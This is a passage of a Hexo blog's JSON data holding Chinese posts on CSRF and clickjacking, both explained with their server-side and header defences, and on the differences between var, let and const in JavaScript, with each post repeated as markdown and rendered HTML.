请求是从哪个页面发出，而浏览器默认给每个请求添加 Cookie 信息。\n\n> note: 同源策略仅仅阻止了第三方站点读取来自其他站点的内容，但是却没有防止这些第三方站点向其他站点发出请求。因为 CSRF 攻击是由于某些请求被发出（而引起在服务器端执行了某些动作）所引起的，所以同源策略只能用来保护第三方站点上的数据的私密性，但是同源策略无法防止 CSRF 攻击。\n\n![CSFR](/images/CSRF.jpg)\n\n完成 CSFR 攻击必须有以下两个步骤:\n\n1. 登录受信任网站A，并生成 Cookie\n2. 在网站 A Cookie 有效期间，登录危险网站 B\n    * 关闭tab页面或浏览器，并不能结束 Session （Cookie 中的 sessionId依然有效，重新登录时会复写）\n    * 危险网站B可能是存在漏洞并受到攻击（XSS 攻击）的大型知名网站\n  \n**CSFR 防御 **（主要在服务器端完成）\n1. 生成随机 `Token`，提交表单时服务器会进行对比 （推荐）\n2. 在后端返回 HTML或用户登录后，将 CSFR 令牌（Token）存放在 `Token` 中，之后的请求再将 `Token` 放在请求头 (如 `x-csfr-token`) 中 (推荐)\n3. 使用 `Same-Site` 属性，部分浏览器支持\n   * Strict：最严格，完全禁止第三方 Cookie，跨站点时，任何情况下都不会发送 Cookie （当前网页的 URL 与请求目标一致，才会带上 Cookie）\n   * Lax：规则稍稍放宽，大多数情况也是不发送第三方 Cookie，但是导航到目标网址的 Get 请求除外\n   * None：显式关闭 SameSite 属性，前提是必须同时设置 Secure 属性（Cookie 只能通过 HTTPS 协议发送）\n4. 表单中添加图片验证码或者一个伪随机数\n5. 检查请求头中的 `referer` 字段，并不一定会带上该字段（可用户图片防盗链，只允许站内使用）\n","source":"_posts/Web 安全/跨站请求伪造(CSRF).md","raw":"---\ntitle: 跨站请求伪造 (CSRF)\ncategories: Web 安全\ntags: [web 安全]\ndate: 2021-01-14 15:41:00\n---\n\n# 跨站请求伪造 (CSRF)\n\n跨站请求伪造 （Cross-Site Request Forgery ，简称为 CRFR/XSRF)\n\n说明：攻击者盗取用户的身份信息，以用户的名义进行恶意操作（数据查询、转账、删除等）\n\n原理：CSRF 攻击是源于 WEB 的隐式身份验证机制（几乎都是使用 Cookie 来识别用户身份以及保存会话状态）。WEB 的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的，因为服务器并不知道 Get、Post 请求是从哪个页面发出，而浏览器默认给每个请求添加 Cookie 信息。\n\n> note: 同源策略仅仅阻止了第三方站点读取来自其他站点的内容，但是却没有防止这些第三方站点向其他站点发出请求。因为 CSRF 攻击是由于某些请求被发出（而引起在服务器端执行了某些动作）所引起的，所以同源策略只能用来保护第三方站点上的数据的私密性，但是同源策略无法防止 CSRF 攻击。\n\n![CSFR](/images/CSRF.jpg)\n\n完成 CSFR 攻击必须有以下两个步骤:\n\n1. 登录受信任网站A，并生成 Cookie\n2. 在网站 A Cookie 有效期间，登录危险网站 B\n    * 关闭tab页面或浏览器，并不能结束 Session （Cookie 中的 sessionId依然有效，重新登录时会复写）\n    * 危险网站B可能是存在漏洞并受到攻击（XSS 攻击）的大型知名网站\n  \n**CSFR 防御 **（主要在服务器端完成）\n1. 生成随机 `Token`，提交表单时服务器会进行对比 （推荐）\n2. 在后端返回 HTML或用户登录后，将 CSFR 令牌（Token）存放在 `Token` 中，之后的请求再将 `Token` 放在请求头 (如 `x-csfr-token`) 中 (推荐)\n3. 使用 `Same-Site` 属性，部分浏览器支持\n   * Strict：最严格，完全禁止第三方 Cookie，跨站点时，任何情况下都不会发送 Cookie （当前网页的 URL 与请求目标一致，才会带上 Cookie）\n   * Lax：规则稍稍放宽，大多数情况也是不发送第三方 Cookie，但是导航到目标网址的 Get 请求除外\n   * None：显式关闭 SameSite 属性，前提是必须同时设置 Secure 属性（Cookie 只能通过 HTTPS 协议发送）\n4. 表单中添加图片验证码或者一个伪随机数\n5. 检查请求头中的 `referer` 字段，并不一定会带上该字段（可用户图片防盗链，只允许站内使用）\n","slug":"Web 安全/跨站请求伪造(CSRF)","published":1,"updated":"2021-05-11T02:35:07.355Z","_id":"cko403s9o000wox6r9ng3d6og","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"跨站请求伪造-CSRF\"><a href=\"#跨站请求伪造-CSRF\" class=\"headerlink\" title=\"跨站请求伪造 (CSRF)\"></a>跨站请求伪造 (CSRF)</h1><p>跨站请求伪造 （Cross-Site Request Forgery ，简称为 CRFR/XSRF)</p>\n<p>说明：攻击者盗取用户的身份信息，以用户的名义进行恶意操作（数据查询、转账、删除等）</p>\n<p>原理：CSRF 攻击是源于 WEB 的隐式身份验证机制（几乎都是使用 Cookie 来识别用户身份以及保存会话状态）。WEB 的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的，因为服务器并不知道 Get、Post 请求是从哪个页面发出，而浏览器默认给每个请求添加 Cookie 信息。</p>\n<blockquote>\n<p>note: 同源策略仅仅阻止了第三方站点读取来自其他站点的内容，但是却没有防止这些第三方站点向其他站点发出请求。因为 CSRF 攻击是由于某些请求被发出（而引起在服务器端执行了某些动作）所引起的，所以同源策略只能用来保护第三方站点上的数据的私密性，但是同源策略无法防止 CSRF 攻击。</p>\n</blockquote>\n<p><img src=\"/images/CSRF.jpg\" alt=\"CSFR\"></p>\n<p>完成 CSFR 攻击必须有以下两个步骤:</p>\n<ol>\n<li>登录受信任网站A，并生成 Cookie</li>\n<li>在网站 A Cookie 有效期间，登录危险网站 B<ul>\n<li>关闭tab页面或浏览器，并不能结束 Session （Cookie 中的 sessionId依然有效，重新登录时会复写）</li>\n<li>危险网站B可能是存在漏洞并受到攻击（XSS 攻击）的大型知名网站</li>\n</ul>\n</li>\n</ol>\n<p>**CSFR 防御 **（主要在服务器端完成）</p>\n<ol>\n<li>生成随机 <code>Token</code>，提交表单时服务器会进行对比 （推荐）</li>\n<li>在后端返回 HTML或用户登录后，将 CSFR 令牌（Token）存放在 <code>Token</code> 中，之后的请求再将 <code>Token</code> 放在请求头 (如 <code>x-csfr-token</code>) 中 (推荐)</li>\n<li>使用 <code>Same-Site</code> 属性，部分浏览器支持<ul>\n<li>Strict：最严格，完全禁止第三方 Cookie，跨站点时，任何情况下都不会发送 Cookie （当前网页的 URL 与请求目标一致，才会带上 Cookie）</li>\n<li>Lax：规则稍稍放宽，大多数情况也是不发送第三方 Cookie，但是导航到目标网址的 Get 请求除外</li>\n<li>None：显式关闭 SameSite 属性，前提是必须同时设置 Secure 属性（Cookie 只能通过 HTTPS 协议发送）</li>\n</ul>\n</li>\n<li>表单中添加图片验证码或者一个伪随机数</li>\n<li>检查请求头中的 <code>referer</code> 字段，并不一定会带上该字段（可用户图片防盗链，只允许站内使用）</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"跨站请求伪造-CSRF\"><a href=\"#跨站请求伪造-CSRF\" class=\"headerlink\" title=\"跨站请求伪造 (CSRF)\"></a>跨站请求伪造 (CSRF)</h1><p>跨站请求伪造 （Cross-Site Request Forgery ，简称为 CRFR/XSRF)</p>\n<p>说明：攻击者盗取用户的身份信息，以用户的名义进行恶意操作（数据查询、转账、删除等）</p>\n<p>原理：CSRF 攻击是源于 WEB 的隐式身份验证机制（几乎都是使用 Cookie 来识别用户身份以及保存会话状态）。WEB 的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的，因为服务器并不知道 Get、Post 请求是从哪个页面发出，而浏览器默认给每个请求添加 Cookie 信息。</p>\n<blockquote>\n<p>note: 同源策略仅仅阻止了第三方站点读取来自其他站点的内容，但是却没有防止这些第三方站点向其他站点发出请求。因为 CSRF 攻击是由于某些请求被发出（而引起在服务器端执行了某些动作）所引起的，所以同源策略只能用来保护第三方站点上的数据的私密性，但是同源策略无法防止 CSRF 攻击。</p>\n</blockquote>\n<p><img src=\"/images/CSRF.jpg\" alt=\"CSFR\"></p>\n<p>完成 CSFR 攻击必须有以下两个步骤:</p>\n<ol>\n<li>登录受信任网站A，并生成 Cookie</li>\n<li>在网站 A Cookie 有效期间，登录危险网站 B<ul>\n<li>关闭tab页面或浏览器，并不能结束 Session （Cookie 中的 sessionId依然有效，重新登录时会复写）</li>\n<li>危险网站B可能是存在漏洞并受到攻击（XSS 攻击）的大型知名网站</li>\n</ul>\n</li>\n</ol>\n<p>**CSFR 防御 **（主要在服务器端完成）</p>\n<ol>\n<li>生成随机 <code>Token</code>，提交表单时服务器会进行对比 （推荐）</li>\n<li>在后端返回 HTML或用户登录后，将 CSFR 令牌（Token）存放在 <code>Token</code> 中，之后的请求再将 <code>Token</code> 放在请求头 (如 <code>x-csfr-token</code>) 中 (推荐)</li>\n<li>使用 <code>Same-Site</code> 属性，部分浏览器支持<ul>\n<li>Strict：最严格，完全禁止第三方 Cookie，跨站点时，任何情况下都不会发送 Cookie （当前网页的 URL 与请求目标一致，才会带上 Cookie）</li>\n<li>Lax：规则稍稍放宽，大多数情况也是不发送第三方 Cookie，但是导航到目标网址的 Get 请求除外</li>\n<li>None：显式关闭 SameSite 属性，前提是必须同时设置 Secure 属性（Cookie 只能通过 HTTPS 协议发送）</li>\n</ul>\n</li>\n<li>表单中添加图片验证码或者一个伪随机数</li>\n<li>检查请求头中的 <code>referer</code> 字段，并不一定会带上该字段（可用户图片防盗链，只允许站内使用）</li>\n</ol>\n"},{"title":"点击劫持","date":"2021-01-14T07:40:00.000Z","_content":"\n# 点击劫持\n**点击劫持**(UI 覆盖攻击)是攻击者使用一个透明的、不可见的 iframe，覆盖在一个网页上，通过调整 iframe 的位置，诱使用户恰好点击在 iframe 页面的一些功能性按钮上\n\n### 操作步骤\n\n1. 访问者被恶意网页吸引。此处略过如何被吸引的。\n2. 页面上存在一个看起来无害的链接（比如：“马上有钱” 或者 “点我，超好玩！”）。\n3. 恶意网页在该链接之上放置一个透明 `<iframe>` 标签，其中 src 指向 facebook.com，如此一来，“点赞” 按钮恰好在链接上面。通常用 z-index 实现。\n4. 如果用户试图点击该链接，实际上是点到了 “点赞” 按钮上。\n  \n### 解决方式\n\n在响应头或 `meta` 标签中使用 `X-Frame-Options`\n1. 可以在响应头中添加，如 `X-Frame-Options: DENY`\n2. 可以在 HTML 的 `meta` 标签中添加，如 `<meta http-equiv=\"X-Frame-Options\" content=\"deny\">`\n3. 通过 JS 代码来判断，如果窗口是顶层窗口，则正常显示，否则不显示，例如判断 `window.top === window.self`\n\n\n**`X-Frame-Options` 有三个值:**\n* DENY: 表示该页面不允许在 frame 中展示，即便是在相同域名的页面中嵌套也不允许。\n* SAMEORIGIN: 表示该页面可以在相同域名页面的 frame 中展示。\n* ALLOW-FROM uri: 表示该页面可以在指定来源的 frame 中展示。\n\n参考\n* [常见 web 安全问题](https://github.com/ljianshu/Blog/issues/56)","source":"_posts/Web 安全/点击劫持.md","raw":"---\ntitle: 点击劫持\ncategories: Web 安全\ntags: [web 安全]\ndate: 2021-01-14 15:40:00\n---\n\n# 点击劫持\n**点击劫持**(UI 覆盖攻击)是攻击者使用一个透明的、不可见的 iframe，覆盖在一个网页上，通过调整 iframe 的位置，诱使用户恰好点击在 iframe 页面的一些功能性按钮上\n\n### 操作步骤\n\n1. 访问者被恶意网页吸引。此处略过如何被吸引的。\n2. 页面上存在一个看起来无害的链接（比如：“马上有钱” 或者 “点我，超好玩！”）。\n3. 恶意网页在该链接之上放置一个透明 `<iframe>` 标签，其中 src 指向 facebook.com，如此一来，“点赞” 按钮恰好在链接上面。通常用 z-index 实现。\n4. 如果用户试图点击该链接，实际上是点到了 “点赞” 按钮上。\n  \n### 解决方式\n\n在响应头或 `meta` 标签中使用 `X-Frame-Options`\n1. 可以在响应头中添加，如 `X-Frame-Options: DENY`\n2. 可以在 HTML 的 `meta` 标签中添加，如 `<meta http-equiv=\"X-Frame-Options\" content=\"deny\">`\n3. 通过 JS 代码来判断，如果窗口是顶层窗口，则正常显示，否则不显示，例如判断 `window.top === window.self`\n\n\n**`X-Frame-Options` 有三个值:**\n* DENY: 表示该页面不允许在 frame 中展示，即便是在相同域名的页面中嵌套也不允许。\n* SAMEORIGIN: 表示该页面可以在相同域名页面的 frame 中展示。\n* ALLOW-FROM uri: 表示该页面可以在指定来源的 frame 中展示。\n\n参考\n* [常见 web 安全问题](https://github.com/ljianshu/Blog/issues/56)","slug":"Web 安全/点击劫持","published":1,"updated":"2021-05-11T02:40:39.441Z","_id":"cko40q5ew0000ei6r2ifmg5g8","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"点击劫持\"><a href=\"#点击劫持\" class=\"headerlink\" title=\"点击劫持\"></a>点击劫持</h1><p><strong>点击劫持</strong>(UI 覆盖攻击)是攻击者使用一个透明的、不可见的 iframe，覆盖在一个网页上，通过调整 iframe 的位置，诱使用户恰好点击在 iframe 页面的一些功能性按钮上</p>\n<h3 id=\"操作步骤\"><a href=\"#操作步骤\" class=\"headerlink\" title=\"操作步骤\"></a>操作步骤</h3><ol>\n<li>访问者被恶意网页吸引。此处略过如何被吸引的。</li>\n<li>页面上存在一个看起来无害的链接（比如：“马上有钱” 或者 “点我，超好玩！”）。</li>\n<li>恶意网页在该链接之上放置一个透明 <code>&lt;iframe&gt;</code> 标签，其中 src 指向 facebook.com，如此一来，“点赞” 按钮恰好在链接上面。通常用 z-index 实现。</li>\n<li>如果用户试图点击该链接，实际上是点到了 “点赞” 按钮上。</li>\n</ol>\n<h3 id=\"解决方式\"><a href=\"#解决方式\" class=\"headerlink\" title=\"解决方式\"></a>解决方式</h3><p>在响应头或 <code>meta</code> 标签中使用 <code>X-Frame-Options</code></p>\n<ol>\n<li>可以在响应头中添加，如 <code>X-Frame-Options: DENY</code></li>\n<li>可以在 HTML 的 <code>meta</code> 标签中添加，如 <code>&lt;meta http-equiv=&quot;X-Frame-Options&quot; content=&quot;deny&quot;&gt;</code></li>\n<li>通过 JS 代码来判断，如果窗口是顶层窗口，则正常显示，否则不显示，例如判断 <code>window.top === window.self</code></li>\n</ol>\n<p><strong><code>X-Frame-Options</code> 有三个值:</strong></p>\n<ul>\n<li>DENY: 表示该页面不允许在 frame 中展示，即便是在相同域名的页面中嵌套也不允许。</li>\n<li>SAMEORIGIN: 表示该页面可以在相同域名页面的 frame 中展示。</li>\n<li>ALLOW-FROM uri: 表示该页面可以在指定来源的 frame 中展示。</li>\n</ul>\n<p>参考</p>\n<ul>\n<li><a href=\"https://github.com/ljianshu/Blog/issues/56\">常见 web 安全问题</a></li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"点击劫持\"><a href=\"#点击劫持\" class=\"headerlink\" title=\"点击劫持\"></a>点击劫持</h1><p><strong>点击劫持</strong>(UI 覆盖攻击)是攻击者使用一个透明的、不可见的 iframe，覆盖在一个网页上，通过调整 iframe 的位置，诱使用户恰好点击在 iframe 页面的一些功能性按钮上</p>\n<h3 id=\"操作步骤\"><a href=\"#操作步骤\" class=\"headerlink\" title=\"操作步骤\"></a>操作步骤</h3><ol>\n<li>访问者被恶意网页吸引。此处略过如何被吸引的。</li>\n<li>页面上存在一个看起来无害的链接（比如：“马上有钱” 或者 “点我，超好玩！”）。</li>\n<li>恶意网页在该链接之上放置一个透明 <code>&lt;iframe&gt;</code> 标签，其中 src 指向 facebook.com，如此一来，“点赞” 按钮恰好在链接上面。通常用 z-index 实现。</li>\n<li>如果用户试图点击该链接，实际上是点到了 “点赞” 按钮上。</li>\n</ol>\n<h3 id=\"解决方式\"><a href=\"#解决方式\" class=\"headerlink\" title=\"解决方式\"></a>解决方式</h3><p>在响应头或 <code>meta</code> 标签中使用 <code>X-Frame-Options</code></p>\n<ol>\n<li>可以在响应头中添加，如 <code>X-Frame-Options: DENY</code></li>\n<li>可以在 HTML 的 <code>meta</code> 标签中添加，如 <code>&lt;meta http-equiv=&quot;X-Frame-Options&quot; content=&quot;deny&quot;&gt;</code></li>\n<li>通过 JS 代码来判断，如果窗口是顶层窗口，则正常显示，否则不显示，例如判断 <code>window.top === window.self</code></li>\n</ol>\n<p><strong><code>X-Frame-Options</code> 有三个值:</strong></p>\n<ul>\n<li>DENY: 表示该页面不允许在 frame 中展示，即便是在相同域名的页面中嵌套也不允许。</li>\n<li>SAMEORIGIN: 表示该页面可以在相同域名页面的 frame 中展示。</li>\n<li>ALLOW-FROM uri: 表示该页面可以在指定来源的 frame 中展示。</li>\n</ul>\n<p>参考</p>\n<ul>\n<li><a href=\"https://github.com/ljianshu/Blog/issues/56\">常见 web 安全问题</a></li>\n</ul>\n"},{"title":"var、let 与 const","date":"2021-04-27T06:24:48.000Z","_content":"\n\n# var、let 与 const 的区别\n\n* 作用域\n  * `var` 只有函数作用域\n  * `let`、`const` 为块级作用域\n* 变量提升\n  *  `var` 会存在变量提升，提升至函数作用域的最上面，不包含赋值 \n  *  `let`、`const` 不存在变量提升，在声明之前调用变量会报错\n* 暂时性死区\n  * `var` 声明不会有暂时性死区\n  * `let`、`const` 声明会有暂时性死区，会报 `xxx is not defined`\n* 重复声明\n  * `var` 可以重复声明\n  * `let`、`const` 不可以在同一作用域内重复声明\n* 全局对象\n  * `val` 声明的全局变量会挂在顶层对象(`window`、`global`)下面\n  * `let`、`const` 声明的全局变量不会挂在顶层对象下\n\n**暂时性死区的作用**：为了减少运行时错误，防止在变量声明前就使用这个变量，从而导致意料之外的行为\n\n`const` 声明的变量需要注意的点：\n1. `const` 需在初始化时赋值，且不可修改；\n2. `const` 声明为变量时，其地址不可变，当变量为对象时，可修改属性；\n\n**内存分配**\n\n* `var`: 会直接在栈内存里预分配内存空间，然后在实际语句执行的时候，在存储对应的变量。如果是引用类型，那么会在堆内存里开开辟一个内存空间存储实际内容，栈内存会存储一个指向堆内存的指针。\n* `let`: 不会在栈内存里预分配内存空间，而且在栈内存分配变量时，会做一个检查，如果已经有相同变量名存在，就会报错。\n\n**变量提升**\n给变量赋值的语句可以理解成三个步骤，创建、初始化、赋值\n\n* `let`、`const` 的**创建**过程提升了，**初始化**过程没有提升，所以会产生**暂时性死区**\n* `var` 的**创建**、**初始化**过程都提升了，所以在赋值前访问会得到 `undefined`\n* `function` 的**创建**、**初始化**、**赋值**都被提升了\n\n函数声明也会存在变量提升，且优先级比 `var` 高，函数赋值不会有变量提升\n\nES6 标准规定\n* `var`、`function` 声明的全局变量， 是全局对象的属性\n* `let`、`const`、`class` 声明的全局变量，不是全局对象的属性\n\n```js\n// var 声明会存在变量提升\n(function() {\n  console.log('name', name);\n  console.log('typeof name', typeof name);\n\n  if (typeof name === 'undefined') {\n    var name = 'Jack'\n    console.log('Goodbye ' + name);\n  } else {\n    console.log('Hello ' + name);\n  }\n})()\n\n// ---- output -----\n// name undefined\n// typeof name undefined\n// Goodbye Jack\n\n// 说明： if 语句里的 var 声明没有块级作用域，会提升至函数的最上层\n```","source":"_posts/JavaScript/var、let 与 const.md","raw":"---\ntitle: var、let 与 const\ncategories: JavaScript\ntags: [JavaScript 基础]\ndate: 2021-04-27 14:24:48\n---\n\n\n# var、let 与 const 的区别\n\n* 作用域\n  * `var` 只有函数作用域\n  * `let`、`const` 为块级作用域\n* 变量提升\n  *  `var` 会存在变量提升，提升至函数作用域的最上面，不包含赋值 \n  *  `let`、`const` 不存在变量提升，在声明之前调用变量会报错\n* 暂时性死区\n  * `var` 声明不会有暂时性死区\n  * `let`、`const` 声明会有暂时性死区，会报 `xxx is not defined`\n* 重复声明\n  * `var` 可以重复声明\n  * `let`、`const` 不可以在同一作用域内重复声明\n* 全局对象\n  * `val` 声明的全局变量会挂在顶层对象(`window`、`global`)下面\n  * `let`、`const` 声明的全局变量不会挂在顶层对象下\n\n**暂时性死区的作用**：为了减少运行时错误，防止在变量声明前就使用这个变量，从而导致意料之外的行为\n\n`const` 声明的变量需要注意的点：\n1. `const` 需在初始化时赋值，且不可修改；\n2. `const` 声明为变量时，其地址不可变，当变量为对象时，可修改属性；\n\n**内存分配**\n\n* `var`: 会直接在栈内存里预分配内存空间，然后在实际语句执行的时候，在存储对应的变量。如果是引用类型，那么会在堆内存里开开辟一个内存空间存储实际内容，栈内存会存储一个指向堆内存的指针。\n* `let`: 不会在栈内存里预分配内存空间，而且在栈内存分配变量时，会做一个检查，如果已经有相同变量名存在，就会报错。\n\n**变量提升**\n给变量赋值的语句可以理解成三个步骤，创建、初始化、赋值\n\n* `let`、`const` 的**创建**过程提升了，**初始化**过程没有提升，所以会产生**暂时性死区**\n* `var` 的**创建**、**初始化**过程都提升了，所以在赋值前访问会得到 `undefined`\n* `function` 的**创建**、**初始化**、**赋值**都被提升了\n\n函数声明也会存在变量提升，且优先级比 `var` 高，函数赋值不会有变量提升\n\nES6 标准规定\n* `var`、`function` 声明的全局变量， 是全局对象的属性\n* `let`、`const`、`class` 声明的全局变量，不是全局对象的属性\n\n```js\n// var 声明会存在变量提升\n(function() {\n  console.log('name', name);\n  console.log('typeof name', typeof name);\n\n  if (typeof name === 'undefined') {\n    var name = 'Jack'\n    console.log('Goodbye ' + name);\n  } else {\n    console.log('Hello ' + name);\n  }\n})()\n\n// ---- output -----\n// name undefined\n// typeof name undefined\n// Goodbye Jack\n\n// 说明： if 语句里的 var 声明没有块级作用域，会提升至函数的最上层\n```","slug":"JavaScript/var、let 与 const","published":1,"updated":"2021-04-30T09:51:21.749Z","_id":"cko40wkn30000ql6ra7xmhlqr","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"var、let-与-const-的区别\"><a href=\"#var、let-与-const-的区别\" class=\"headerlink\" title=\"var、let 与 const 的区别\"></a>var、let 与 const 的区别</h1><ul>\n<li>作用域<ul>\n<li><code>var</code> 只有函数作用域</li>\n<li><code>let</code>、<code>const</code> 为块级作用域</li>\n</ul>\n</li>\n<li>变量提升<ul>\n<li> <code>var</code> 会存在变量提升，提升至函数作用域的最上面，不包含赋值 </li>\n<li> <code>let</code>、<code>const</code> 不存在变量提升，在声明之前调用变量会报错</li>\n</ul>\n</li>\n<li>暂时性死区<ul>\n<li><code>var</code> 声明不会有暂时性死区</li>\n<li><code>let</code>、<code>const</code> 声明会有暂时性死区，会报 <code>xxx is not defined</code></li>\n</ul>\n</li>\n<li>重复声明<ul>\n<li><code>var</code> 可以重复声明</li>\n<li><code>let</code>、<code>const</code> 不可以在同一作用域内重复声明</li>\n</ul>\n</li>\n<li>全局对象<ul>\n<li><code>val</code> 声明的全局变量会挂在顶层对象(<code>window</code>、<code>global</code>)下面</li>\n<li><code>let</code>、<code>const</code> 声明的全局变量不会挂在顶层对象下</li>\n</ul>\n</li>\n</ul>\n<p><strong>暂时性死区的作用</strong>：为了减少运行时错误，防止在变量声明前就使用这个变量，从而导致意料之外的行为</p>\n<p><code>const</code> 声明的变量需要注意的点：</p>\n<ol>\n<li><code>const</code> 需在初始化时赋值，且不可修改；</li>\n<li><code>const</code> 声明为变量时，其地址不可变，当变量为对象时，可修改属性；</li>\n</ol>\n<p><strong>内存分配</strong></p>\n<ul>\n<li><code>var</code>: 会直接在栈内存里预分配内存空间，然后在实际语句执行的时候，在存储对应的变量。如果是引用类型，那么会在堆内存里开开辟一个内存空间存储实际内容，栈内存会存储一个指向堆内存的指针。</li>\n<li><code>let</code>: 不会在栈内存里预分配内存空间，而且在栈内存分配变量时，会做一个检查，如果已经有相同变量名存在，就会报错。</li>\n</ul>\n<p><strong>变量提升</strong><br>给变量赋值的语句可以理解成三个步骤，创建、初始化、赋值</p>\n<ul>\n<li><code>let</code>、<code>const</code> 的<strong>创建</strong>过程提升了，<strong>初始化</strong>过程没有提升，所以会产生<strong>暂时性死区</strong></li>\n<li><code>var</code> 的<strong>创建</strong>、<strong>初始化</strong>过程都提升了，所以在赋值前访问会得到 <code>undefined</code></li>\n<li><code>function</code> 的<strong>创建</strong>、<strong>初始化</strong>、<strong>赋值</strong>都被提升了</li>\n</ul>\n<p>函数声明也会存在变量提升，且优先级比 <code>var</code> 高，函数赋值不会有变量提升</p>\n<p>ES6 标准规定</p>\n<ul>\n<li><code>var</code>、<code>function</code> 声明的全局变量， 是全局对象的属性</li>\n<li><code>let</code>、<code>const</code>、<code>class</code> 声明的全局变量，不是全局对象的属性</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// var 声明会存在变量提升</span></span><br><span class=\"line\">(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">&#x27;name&#x27;</span>, name);</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">&#x27;typeof name&#x27;</span>, <span class=\"keyword\">typeof</span> name);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> name === <span class=\"string\">&#x27;undefined&#x27;</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> name = <span class=\"string\">&#x27;Jack&#x27;</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">&#x27;Goodbye &#x27;</span> + name);</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">&#x27;Hello &#x27;</span> + name);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;)()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// ---- output -----</span></span><br><span class=\"line\"><span class=\"comment\">// name undefined</span></span><br><span class=\"line\"><span class=\"comment\">// typeof name undefined</span></span><br><span class=\"line\"><span class=\"comment\">// Goodbye Jack</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 说明： if 语句里的 var 声明没有块级作用域，会提升至函数的最上层</span></span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"var、let-与-const-的区别\"><a href=\"#var、let-与-const-的区别\" class=\"headerlink\" title=\"var、let 与 const 的区别\"></a>var、let 与 const 的区别</h1><ul>\n<li>作用域<ul>\n<li><code>var</code> 只有函数作用域</li>\n<li><code>let</code>、<code>const</code> 为块级作用域</li>\n</ul>\n</li>\n<li>变量提升<ul>\n<li> <code>var</code> 会存在变量提升，提升至函数作用域的最上面，不包含赋值 </li>\n<li> <code>let</code>、<code>const</code> 不存在变量提升，在声明之前调用变量会报错</li>\n</ul>\n</li>\n<li>暂时性死区<ul>\n<li><code>var</code> 声明不会有暂时性死区</li>\n<li><code>let</code>、<code>const</code> 声明会有暂时性死区，会报 <code>xxx is not defined</code></li>\n</ul>\n</li>\n<li>重复声明<ul>\n<li><code>var</code> 可以重复声明</li>\n<li><code>let</code>、<code>const</code> 不可以在同一作用域内重复声明</li>\n</ul>\n</li>\n<li>全局对象<ul>\n<li><code>val</code> 声明的全局变量会挂在顶层对象(<code>window</code>、<code>global</code>)下面</li>\n<li><code>let</code>、<code>const</code> 声明的全局变量不会挂在顶层对象下</li>\n</ul>\n</li>\n</ul>\n<p><strong>暂时性死区的作用</strong>：为了减少运行时错误，防止在变量声明前就使用这个变量，从而导致意料之外的行为</p>\n<p><code>const</code> 声明的变量需要注意的点：</p>\n<ol>\n<li><code>const</code> 需在初始化时赋值，且不可修改；</li>\n<li><code>const</code> 声明为变量时，其地址不可变，当变量为对象时，可修改属性；</li>\n</ol>\n<p><strong>内存分配</strong></p>\n<ul>\n<li><code>var</code>: 会直接在栈内存里预分配内存空间，然后在实际语句执行的时候，在存储对应的变量。如果是引用类型，那么会在堆内存里开开辟一个内存空间存储实际内容，栈内存会存储一个指向堆内存的指针。</li>\n<li><code>let</code>: 不会在栈内存里预分配内存空间，而且在栈内存分配变量时，会做一个检查，如果已经有相同变量名存在，就会报错。</li>\n</ul>\n<p><strong>变量提升</strong><br>给变量赋值的语句可以理解成三个步骤，创建、初始化、赋值</p>\n<ul>\n<li><code>let</code>、<code>const</code> 的<strong>创建</strong>过程提升了，<strong>初始化</strong>过程没有提升，所以会产生<strong>暂时性死区</strong></li>\n<li><code>var</code> 的<strong>创建</strong>、<strong>初始化</strong>过程都提升了，所以在赋值前访问会得到 <code>undefined</code></li>\n<li><code>function</code> 的<strong>创建</strong>、<strong>初始化</strong>、<strong>赋值</strong>都被提升了</li>\n</ul>\n<p>函数声明也会存在变量提升，且优先级比 <code>var</code> 高，函数赋值不会有变量提升</p>\n<p>ES6 标准规定</p>\n<ul>\n<li><code>var</code>、<code>function</code> 声明的全局变量， 是全局对象的属性</li>\n<li><code>let</code>、<code>const</code>、<code>class</code> 声明的全局变量，不是全局对象的属性</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span 